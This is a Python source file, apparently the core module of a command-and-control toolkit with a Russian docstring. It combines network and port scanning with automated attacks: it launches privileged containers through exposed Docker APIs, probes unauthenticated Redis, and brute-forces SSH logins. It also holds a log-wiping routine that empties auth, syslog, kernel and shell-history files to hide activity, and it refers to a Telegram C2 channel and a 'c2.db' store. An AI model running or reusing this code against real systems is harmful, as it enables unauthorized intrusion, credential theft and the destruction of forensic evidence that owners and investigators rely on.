#!/usr/bin/env python3
"""
CORE UNIFIED MODULE
Объединённые функции: scanner, counter-surveillance, exploits, integration
"""
import os, sys, json, subprocess, threading, time
from typing import Dict, List, Optional
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
from src.utils.logger import get_logger

log = get_logger('unified')

# ============================================================================
# AUTONOMOUS SCANNER
# ============================================================================
class Scanner:
    @staticmethod
    def wifi_scan() -> List[Dict]:
        """WiFi scanning"""
        try:
            result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
            networks = []
            for line in result.stdout.split("\n"):
                if "ESSID:" in line:
                    ssid = line.split("ESSID:")[1].strip('"')
                    if ssid: networks.append({"ssid": ssid, "type": "wifi"})
            return networks
        except: return []
    
    @staticmethod
    def network_scan(interface: str = "eth0") -> List[Dict]:
        """Network ARP scan"""
        try:
            result = subprocess.run(["arp-scan", "-I", interface, "-l"],
                                   capture_output=True, text=True, timeout=60)
            hosts = []
            for line in result.stdout.split("\n"):
                if "\t" in line:
                    parts = line.split("\t")
                    if len(parts) >= 2:
                        hosts.append({"ip": parts[0], "mac": parts[1], "type": "host"})
            return hosts
        except: return []
    
    @staticmethod
    def port_scan(target: str, ports: str = "1-1000") -> List[int]:
        """Quick port scan"""
        try:
            result = subprocess.run(["nmap", "-p", ports, "--open", "-T4", target],
                                   capture_output=True, text=True, timeout=120)
            open_ports = []
            for line in result.stdout.split("\n"):
                if "/tcp" in line and "open" in line:
                    port = int(line.split("/")[0])
                    open_ports.append(port)
            return open_ports
        except: return []

# ============================================================================
# COUNTER-SURVEILLANCE
# ============================================================================
class CounterSurveillance:
    @staticmethod
    def setup_tor() -> bool:
        """Setup Tor"""
        try:
            # Try without sudo first
            result = subprocess.run(["systemctl", "is-active", "tor"], 
                                   capture_output=True, text=True, timeout=5)
            if "active" in result.stdout:
                return True
            
            # Try to start
            subprocess.run(["systemctl", "start", "tor"], 
                          capture_output=True, timeout=10)
            return True
        except Exception as e:
            log.warning(f"Tor setup failed: {e}")
            return False
    
    @staticmethod
    def clean_logs():
        """Clean system logs"""
        logs = ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log",
                "~/.bash_history", "~/.zsh_history"]
        for logfile in logs:
            try:
                path = os.path.expanduser(logfile)
                if os.path.exists(path):
                    open(path, "w").close()
            except Exception as e:
                log.debug(f"Could not clean {logfile}: {e}")
    
    @staticmethod
    def detect_malware() -> List[str]:
        """Detect surveillance malware"""
        suspicious = []
        patterns = ["pegasus", "finfisher", "hacking", "spyware"]
        try:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split("\n"):
                for pattern in patterns:
                    if pattern in line.lower():
                        suspicious.append(line)
        except Exception as e:
            log.debug(f"Malware detection error: {e}")
        return suspicious

# ============================================================================
# EXPLOITS
# ============================================================================
class Exploits:
    @staticmethod
    def docker_exploit(target: str, port: int = 2375) -> bool:
        """Docker API exploit"""
        try:
            import docker
            client = docker.DockerClient(base_url=f"tcp://{target}:{port}")
            container = client.containers.run(
                "alpine",
                command="sh -c 'echo EXPLOITED'",
                detach=True,
                privileged=True
            )
            log.info(f"Docker exploit success: {target}")
            return True
        except: return False
    
    @staticmethod
    def redis_exploit(target: str, port: int = 6379) -> bool:
        """Redis exploit"""
        try:
            import redis
            r = redis.Redis(host=target, port=port, socket_timeout=5)
            r.ping()
            log.info(f"Redis accessible: {target}")
            return True
        except: return False
    
    @staticmethod
    def ssh_bruteforce(target: str, users: List[str], passwords: List[str]) -> Optional[tuple]:
        """SSH bruteforce"""
        try:
            import paramiko
            for user in users:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, username=user, password=password, timeout=5)
                        log.info(f"SSH success: {user}:{password}@{target}")
                        return (user, password)
                    except: pass
        except: pass
        return None

# ============================================================================
# INTEGRATION
# ============================================================================
class Integration:
    def __init__(self):
        # Telegram C2 works directly - no URL needed
        self.scanner = Scanner()
        self.counter = CounterSurveillance()
        self.exploits = Exploits()
        self.running = False
    
    def start(self):
        """Start all modules"""
        self.running = True
        log.subsection("Starting Integration Modules")
        
        # Setup counter-surveillance
        log.info("Setting up Tor...")
        if self.counter.setup_tor():
            log.success("Tor configured")
        else:
            log.warning("Tor setup failed (may need sudo)")
        
        # Start scanner thread
        log.info("Starting scanner thread...")
        threading.Thread(target=self._scan_loop, daemon=True).start()
        log.success("Scanner thread started")
        
        # Start counter-surveillance thread
        log.info("Starting counter-surveillance thread...")
        threading.Thread(target=self._counter_loop, daemon=True).start()
        log.success("Counter-surveillance thread started")
        
        log.success("Integration started successfully")
    
    def _scan_loop(self):
        """Scanning loop"""
        while self.running:
            try:
                networks = self.scanner.wifi_scan()
                if networks:
                    log.info(f"Found {len(networks)} WiFi networks")
                time.sleep(300)
            except Exception as e:
                log.error(f"Scan error: {e}")
                time.sleep(60)
    
    def _counter_loop(self):
        """Counter-surveillance loop"""
        while self.running:
            try:
                malware = self.counter.detect_malware()
                if malware:
                    log.warning(f"Suspicious processes detected: {len(malware)}")
                    for proc in malware[:3]:  # Show first 3
                        log.warning(f"  - {proc}")
                time.sleep(600)
            except Exception as e:
                log.error(f"Counter error: {e}")
                time.sleep(60)
    
    def stop(self):
        """Stop all modules"""
        self.running = False
        log.info("Integration stopped")
    
    def scan_target(self, target: str) -> Dict:
        """Scan single target"""
        result = {
            "target": target,
            "ports": self.scanner.port_scan(target),
            "exploits": []
        }
        
        # Try exploits
        if 2375 in result["ports"]:
            if self.exploits.docker_exploit(target):
                result["exploits"].append("docker")
        
        if 6379 in result["ports"]:
            if self.exploits.redis_exploit(target):
                result["exploits"].append("redis")
        
        return result

# ============================================================================
# ALERTS
# ============================================================================
class AlertLevel(Enum):
    INFO = "info"
    WARNING = "warning"
    ERROR = "error"
    CRITICAL = "critical"

@dataclass
class Alert:
    level: AlertLevel
    title: str
    message: str
    timestamp: float
    source: str
    metadata: Dict = None

class AlertManager:
    def __init__(self):
        self.alerts = []
        self.max_alerts = 1000
    
    def fire_alert(self, level, title, message, source="system"):
        alert = Alert(level, title, message, time.time(), source)
        self.alerts.append(alert)
        if len(self.alerts) > self.max_alerts:
            self.alerts = self.alerts[-self.max_alerts:]
        log.warning(f"[Alert] {title}: {message}")

# ============================================================================
# METRICS
# ============================================================================
class MetricsCollector:
    def __init__(self, db_path=None):
        self.db_path = db_path or "data/c2.db"
        self.start_time = time.time()
    
    def get_system_metrics(self) -> Dict:
        try:
            import psutil
            return {
                "cpu_percent": psutil.cpu_percent(interval=0.1),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent,
                "uptime_seconds": time.time() - self.start_time
            }
        except: return {}
    
    def export_json(self) -> Dict:
        return {
            "timestamp": datetime.now().isoformat(),
            "system": self.get_system_metrics()
        }

# ============================================================================
# HEALTH
# ============================================================================
class HealthMonitor:
    @staticmethod
    def check_health() -> Dict:
        try:
            import psutil
            return {
                "status": "healthy",
                "cpu_percent": psutil.cpu_percent(interval=0.1),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent
            }
        except:
            return {"status": "unknown"}

# ============================================================================
# EXPORT
# ============================================================================
__all__ = ['Scanner', 'CounterSurveillance', 'Exploits', 'Integration', 
           'AlertManager', 'MetricsCollector', 'HealthMonitor']

if __name__ == "__main__":
    import logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(message)s')
    
    integration = Integration()
    integration.start()
    
    print("Integration running. Press Ctrl+C to stop...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        integration.stop()
